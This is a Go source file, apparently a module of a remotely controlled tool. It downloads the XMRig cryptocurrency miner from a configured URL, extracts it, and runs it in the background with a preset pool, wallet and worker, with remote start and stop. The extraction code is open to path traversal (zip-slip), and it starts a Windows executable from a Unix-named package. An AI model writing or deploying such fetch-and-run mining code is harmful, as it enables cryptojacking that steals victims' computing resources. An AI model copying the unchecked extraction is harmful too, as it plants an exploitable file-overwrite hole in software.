package func_unix

import (
	"archive/zip"
	"fmt"
	"head/head_com/config_func"
	"io"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
)

var minerCmd *exec.Cmd
var stopMiningChan = make(chan struct{})

func downloadXMRig() error {
	destDir := "data_use/miner"
	filename := filepath.Join(destDir, "xmrig.zip")

	err := os.MkdirAll(destDir, 0755)
	if err != nil {
		return fmt.Errorf("error creating directory: %v", err)
	}

	config_func.Log_append("Downloading XMRig")

	resp, err := http.Get(config_func.Miner_github)
	if err != nil {
		return fmt.Errorf("error downloading XMRig: %v", err)
	}
	defer resp.Body.Close()

	out, err := os.Create(filename)
	if err != nil {
		return fmt.Errorf("error creating file: %v", err)
	}
	defer out.Close()

	_, err = io.Copy(out, resp.Body)
	if err != nil {
		return fmt.Errorf("error saving file: %v", err)
	}

	config_func.Log_append("Downloaded miner")

	return nil
}

func extractXMRig() error {
	zipPath := "data_use/miner/xmrig.zip"
	destDir := "data_use/miner/xmrig"

	fmt.Println("📦 Extracting XMRig...")
	zipFile, err := zip.OpenReader(zipPath)
	if err != nil {
		return fmt.Errorf("error opening zip file: %v", err)
	}
	defer zipFile.Close()

	err = os.MkdirAll(destDir, 0755)
	if err != nil {
		return fmt.Errorf("error creating directory: %v", err)
	}

	for _, file := range zipFile.File {
		filePath := filepath.Join(destDir, file.Name)
		if file.FileInfo().IsDir() {
			os.MkdirAll(filePath, file.Mode())
		} else {
			outFile, err := os.Create(filePath)
			if err != nil {
				return fmt.Errorf("error creating file %v: %v", file.Name, err)
			}
			defer outFile.Close()

			fileReader, err := file.Open()
			if err != nil {
				return fmt.Errorf("error opening file %v: %v", file.Name, err)
			}
			defer fileReader.Close()

			_, err = io.Copy(outFile, fileReader)
			if err != nil {
				return fmt.Errorf("error extracting file %v: %v", file.Name, err)
			}
		}
	}

	config_func.Log_append("Extracted miner")

	return nil
}

func StartMining() error {
	xmrigPath := filepath.Join("data_use/miner/xmrig", "xmrig-6.21.1", "xmrig.exe")
	if _, err := os.Stat(xmrigPath); os.IsNotExist(err) {
		if err := downloadXMRig(); err != nil {
			return err
		}
		if err := extractXMRig(); err != nil {
			return err
		}
	}

	config_func.Log_append("Starting mining in background")

	cmd := exec.Command(xmrigPath,
		"-o", config_func.POOL,
		"-u", config_func.WALLET,
		"-k",
		"-p", config_func.WORKER,
		"-a", "rx/0",
	)

	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	cmd.Stdin = os.Stdin

	go func() {
		err := cmd.Start()
		if err != nil {
			config_func.Log_append("Error starting mining")
		}
		err = cmd.Wait()
		if err != nil {
			config_func.Log_append("Mining process terminated")
		}
	}()

	go func() {
		<-stopMiningChan
		if err := cmd.Process.Kill(); err != nil {
			config_func.Log_append("Error stopping mining")
		} else {
			config_func.Log_append("Miner stopped")
		}
	}()

	return nil
}

func StopMining() {
	stopMiningChan <- struct{}{}
}
